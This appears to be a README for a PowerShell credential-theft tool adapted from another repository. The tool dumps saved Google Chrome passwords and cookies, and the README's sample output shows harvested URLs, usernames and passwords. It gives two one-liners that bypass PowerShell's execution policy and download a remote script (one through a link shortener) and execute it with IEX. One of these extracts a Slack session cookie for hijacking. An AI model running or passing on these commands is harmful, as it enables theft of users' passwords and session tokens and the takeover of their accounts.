Note: Most of this code comes from https://github.com/et0x/Get-ChromePasswords, I've only mildly tweeked it and added in cookie dumping.

# Get-ChromePasswords
```PowerShell
.Synopsis
  Quickly retrieve Google Chrome passwords using powershell (please note this creates sqlite assemblies in your temp directory)

.PARAMETER Path
  
  The optional path to a non-standard database location for the Google Chrome Login Data database.  Generally found at '<APPDATA>\Local\Google\Chrome\Default\Login Data'

.EXAMPLE
  PS> .\Get-ChromePasswords

  Url                                                                                                    Username                  Password
  ---                                                                                                    --------                  --------
  https://accounts.google.com/signin/challenge/sl/password                                               user1                     password
  ...
```

## Quick mode...

```PowerShell
  C:\> powershell -exec bypass -c "IEX((new-object net.webclient).downloadstring('https://bit.ly/2OMBArT'));Get-ChromeCreds"
```

## Just pull "d" Cookie for use with SlackExtract...

```PowerShell
powershell -exec bypass -c "IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/clr2of8/Get-ChromePasswords/master/Get-CC.ps1'));Get-CC -SE"
```

